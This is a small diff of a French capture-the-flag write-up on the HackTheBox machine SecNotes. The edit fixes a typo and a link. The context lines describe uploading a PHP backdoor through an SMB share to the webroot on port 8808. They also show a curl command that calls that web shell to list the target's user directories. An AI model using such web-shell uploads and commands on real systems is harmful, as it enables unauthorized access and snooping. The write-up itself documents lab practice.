@@ -87,9 +87,9 @@ smb: \> ls
   iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018
 ```
 
-Ces fichier correspondent à ce que l'on peut trouver sur le port 8808. On peut y placer du PHP qui sera interprété, peut être aussi de l'ASP mais *Windows Defender* est prêt à supprimer nos web-meterpreters.  
+Ces fichiers correspondent à ce que l'on peut trouver sur le port 8808. On peut y placer du PHP qui sera interprété, peut être aussi de l'ASP mais *Windows Defender* est prêt à supprimer nos web-meterpreters.  
 
-J'ai commencé par uploader une backdoor généraliste (voir [ce précédent article](http://devloop.users.sourceforge.net/index.php?article128/tales-of-pentest-1-celui-qui-donnait-la-permission-file)) histoire de fouiller un peu :  
+J'ai commencé par uploader une backdoor généraliste (voir [ce précédent article]({% link _posts/2017-07-07-Tales-of-PenTest-1-Celui-qui-donnait-la-permission-FILE.md %})) histoire de fouiller un peu :  
 
 ```plain
 $ curl --data 'f=scandir&a=c:/users/&rf=print_r' http://secnotes.htb:8808/devloop_.php
